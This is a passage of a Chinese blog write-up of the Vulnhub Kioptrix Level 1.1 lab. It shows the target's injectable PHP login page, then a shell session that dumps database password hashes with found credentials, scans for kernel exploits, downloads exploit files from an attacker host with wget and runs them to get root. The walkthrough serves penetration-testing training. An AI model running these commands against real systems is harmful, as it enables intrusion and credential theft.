class="line">                        &lt;td&gt;&lt;input name=<span class="string">&quot;uname&quot;</span> type=<span class="string">&quot;text&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                        &lt;td width=<span class="string">&quot;150&quot;</span>&gt;Password&lt;/td&gt;</span><br><span class="line">                        &lt;td&gt;</span><br><span class="line">                        &lt;input name=<span class="string">&quot;psw&quot;</span> type=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">                        &lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                        &lt;td colspan=<span class="string">&quot;2&quot;</span> align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">                        &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;btnLogin&quot;</span> value=<span class="string">&quot;Login&quot;</span>&gt;</span><br><span class="line">                        &lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        &#125; <span class="comment">//END of login form</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- Start of HTML when logged in <span class="keyword">as</span> Administator --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;form name=<span class="string">&quot;ping&quot;</span> action=<span class="string">&quot;pingit.php&quot;</span> method=<span class="string">&quot;post&quot;</span> target=<span class="string">&quot;_blank&quot;</span>&gt;</span><br><span class="line">                &lt;table width=<span class="string">&#x27;600&#x27;</span> border=<span class="string">&#x27;1&#x27;</span>&gt;</span><br><span class="line">                &lt;tr valign=<span class="string">&#x27;middle&#x27;</span>&gt;</span><br><span class="line">                        &lt;td colspan=<span class="string">&#x27;2&#x27;</span> align=<span class="string">&#x27;center&#x27;</span>&gt;</span><br><span class="line">                        &lt;b&gt;Welcome to the Basic Administrative Web Console&lt;br&gt;&lt;/b&gt;</span><br><span class="line">                        &lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">                &lt;tr valign=<span class="string">&#x27;middle&#x27;</span>&gt;</span><br><span class="line">                        &lt;td align=<span class="string">&#x27;center&#x27;</span>&gt;</span><br><span class="line">                                Ping a Machine on the Network:</span><br><span class="line">                        &lt;/td&gt;</span><br><span class="line">                                &lt;td align=<span class="string">&#x27;center&#x27;</span>&gt;</span><br><span class="line">                                &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;ip&quot;</span> size=<span class="string">&quot;30&quot;</span>&gt;</span><br><span class="line">                                &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">                        &lt;/td&gt;</span><br><span class="line">                        &lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>SQL 语句直接做了拼接，未进行过滤和转义等操作。</p>
+<p>有数据库链接信息，测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ mysql -ujohn -phiroshima -e <span class="string">&quot;select * from webapp.users;&quot;</span></span><br><span class="line">mysql -ujohn -phiroshima -e <span class="string">&quot;select * from webapp.users;&quot;</span></span><br><span class="line">+------+----------+------------+</span><br><span class="line">| <span class="built_in">id</span>   | username | password   |</span><br><span class="line">+------+----------+------------+</span><br><span class="line">|    1 | admin    | 5afac8d85f |</span><br><span class="line">|    2 | john     | 66lajGGbla |</span><br><span class="line">+------+----------+------------+</span><br><span class="line">bash-3.00$ mysql -uroot -phiroshima -e <span class="string">&quot;select User,Password from mysql.user;&quot;</span></span><br><span class="line">mysql -uroot -phiroshima -e <span class="string">&quot;select User,Password from mysql.user;&quot;</span></span><br><span class="line">+------+------------------+</span><br><span class="line">| User | Password         |</span><br><span class="line">+------+------------------+</span><br><span class="line">| root | 5a6914ba69e02807 |</span><br><span class="line">| root | 5a6914ba69e02807 |</span><br><span class="line">|      |                  |</span><br><span class="line">|      |                  |</span><br><span class="line">| john | 5a6914ba69e02807 |</span><br><span class="line">+------+------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="提权-1">3.2. 提权</h3>
+<p>可上传集成化的工具扫描可能存在提权漏洞的信息</p>
+<blockquote>
+<p>内核漏洞利用的工具：<br />
+<a
+target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester.sh</a><br />
+<a
+target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2.pl</a><br />
+<a
+target="_blank" rel="noopener" href="http://www.securitysift.com/download/linuxprivchecker.py">linuxprivchecker.py</a>（在受害者中执行，仅检查内核
+2.x 的漏洞利用）</p>
+</blockquote>
+<p>linuxprivchecker.py 扫描示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ python linuxprivchecker.py</span><br><span class="line">python linuxprivchecker.py</span><br><span class="line">=================================================================================================</span><br><span class="line">LINUX PRIVILEGE ESCALATION CHECKER</span><br><span class="line">=================================================================================================</span><br><span class="line"></span><br><span class="line">[*] GETTING BASIC SYSTEM INFO...</span><br><span class="line"></span><br><span class="line">[+] Kernel</span><br><span class="line">    Linux version 2.6.9-55.EL (mockbuild@builder6.centos.org) (gcc version 3.4.6 20060404 (Red Hat 3.4.6-8)) <span class="comment">#1 Wed May 2 13:52:16 EDT 2007</span></span><br><span class="line"></span><br><span class="line">[+] Hostname</span><br><span class="line">    kioptrix.level2</span><br><span class="line"></span><br><span class="line">………………</span><br><span class="line"></span><br><span class="line">[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...</span><br><span class="line"></span><br><span class="line">    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a <span class="string">&#x27;**&#x27;</span> but should still be tested!</span><br><span class="line"></span><br><span class="line">    The following exploits are ranked higher <span class="keyword">in</span> probability of success because this script detected a related running process, OS, or mounted file system</span><br><span class="line">    - 2.6 UDEV &lt; 141 Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8572 || Language=c</span><br><span class="line">    - 2.6 UDEV Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8478 || Language=c</span><br><span class="line">    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c</span><br><span class="line"></span><br><span class="line">    The following exploits are applicable to this kernel version and should be investigated as well</span><br><span class="line">    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c</span><br><span class="line">    - 2.x sock_sendpage() Local Root Exploit 2 || http://www.exploit-db.com/exploits/9436 || Language=c</span><br><span class="line">    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c</span><br><span class="line">    - 2.4/2.6 sock_sendpage() ring0 Root Exploit (simple ver) || http://www.exploit-db.com/exploits/9479 || Language=c</span><br><span class="line">    - 2.6 UDEV &lt; 141 Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8572 || Language=c</span><br><span class="line">    - 2.4/2.6 sock_sendpage() Local Root Exploit [2] || http://www.exploit-db.com/exploits/9598 || Language=c</span><br><span class="line">    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c</span><br><span class="line">    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c</span><br><span class="line">    - 2.6.x ptrace_attach Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8673 || Language=c</span><br><span class="line">    - 2.x sock_sendpage() Local Ring0 Root Exploit || http://www.exploit-db.com/exploits/9435 || Language=c</span><br><span class="line">    - 2.4/2.6 bluez Local Root Privilege Escalation Exploit (update) || http://www.exploit-db.com/exploits/926 || Language=c</span><br><span class="line">    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c</span><br><span class="line">    - 2.4/2.6 sock_sendpage() Local Root Exploit (ppc) || http://www.exploit-db.com/exploits/9545 || Language=c</span><br><span class="line">    - 2.6 UDEV Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/8478 || Language=c</span><br><span class="line">    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c</span><br><span class="line">    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**</span><br><span class="line">    - 2.4/2.6 sock_sendpage() Local Root Exploit [3] || http://www.exploit-db.com/exploits/9641 || Language=c</span><br><span class="line">    - 2.4.x / 2.6.x uselib() Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/895 || Language=c</span><br><span class="line"></span><br><span class="line">Finished</span><br><span class="line">=================================================================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>根据扫描结果下面漏洞发现亦可成功提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 2.x sock_sendpage() Local Root Exploit 2 || http://www.exploit-db.com/exploits/9436 || Language=c</span><br></pre></td></tr></table></figure>
+<p>测试如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ wget http://192.168.1.184:8000/proto_ops/run.c</span><br><span class="line">wget http://192.168.1.184:8000/proto_ops/run.c</span><br><span class="line">--02:35:24--  http://192.168.1.184:8000/proto_ops/run.c</span><br><span class="line">           =&gt; <span class="string">&#x27;run.c&#x27;</span></span><br><span class="line">Connecting to 192.168.1.184:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 244 [text/x-csrc]</span><br><span class="line"></span><br><span class="line">100%[====================================&gt;] 244           --.--K/s             </span><br><span class="line"></span><br><span class="line">02:35:24 (19.39 MB/s) - <span class="string">&#x27;run.c&#x27;</span> saved [244/244]</span><br><span class="line"></span><br><span class="line">bash-3.00$ wget http://192.168.1.184:8000/proto_ops/run.sh</span><br><span class="line">wget http://192.168.1.184:8000/proto_ops/run.sh</span><br><span class="line">--02:35:44--  http://192.168.1.184:8000/proto_ops/run.sh</span><br><span class="line">           =&gt; <span class="string">&#x27;run.sh&#x27;</span></span><br><span class="line">Connecting to 192.168.1.184:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 69 [text/x-sh]</span><br><span class="line"></span><br><span class="line">100%[====================================&gt;] 69            --.--K/s             </span><br><span class="line"></span><br><span class="line">02:35:44 (3.87 MB/s) - <span class="string">&#x27;run.sh&#x27;</span> saved [69/69]</span><br><span class="line"></span><br><span class="line">bash-3.00$ wget http://192.168.1.184:8000/proto_ops/exploit.c</span><br><span class="line">wget http://192.168.1.184:8000/proto_ops/exploit.c</span><br><span class="line">--02:35:53--  http://192.168.1.184:8000/proto_ops/exploit.c</span><br><span class="line">           =&gt; <span class="string">&#x27;exploit.c&#x27;</span></span><br><span class="line">Connecting to 192.168.1.184:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2,776 (2.7K) [text/x-csrc]</span><br><span class="line"></span><br><span class="line">100%[====================================&gt;] 2,776         --.--K/s             </span><br><span class="line"></span><br><span class="line">02:35:53 (203.65 MB/s) - <span class="string">&#x27;exploit.c&#x27;</span> saved [2776/2776]</span><br><span class="line"></span><br><span class="line">bash-3.00$ <span class="built_in">chmod</span> +x run.sh</span><br><span class="line"><span class="built_in">chmod</span> +x run.sh</span><br><span class="line">bash-3.00$ <span class="built_in">ls</span> -al run.sh</span><br><span class="line"><span class="built_in">ls</span> -al run.sh</span><br><span class="line">-rwxr-xr-x  1 apache apache 69 Aug 14  2009 run.sh</span><br><span class="line">bash-3.00$ ./run.sh</span><br><span class="line">./run.sh</span><br><span class="line">padlina z lublina!</span><br><span class="line">sh-3.00<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=48(apache)</span><br><span class="line">sh-3.00<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<p><strong>参考</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02
+Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 -
+wsec - 博客园</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Phantom
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/09/19/Kioptrix%20Level%201.1/" title="Kioptrix: Level 1.1">https://z9m8r8.github.io/2024/09/19/Kioptrix Level 1.1/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+              <a href="/tags/Command-Injection/" rel="tag"><i class="fa fa-tag"></i> Command Injection</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%81/" rel="tag"><i class="fa fa-tag"></i> 信息收集、</a>
+              <a href="/tags/SQL-Injection/" rel="tag"><i class="fa fa-tag"></i> SQL Injection</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/09/12/VulNyx%20-%20Transfer/" rel="prev" title="VulNyx - Transfer">
+                  <i class="fa fa-angle-left"></i> VulNyx - Transfer
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/09/23/Chronos%201/" rel="next" title="Chronos: 1">
+                  Chronos: 1 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Phantom</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">294k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">17:50</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/09/19/Kioptrix%20Level%201.1/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
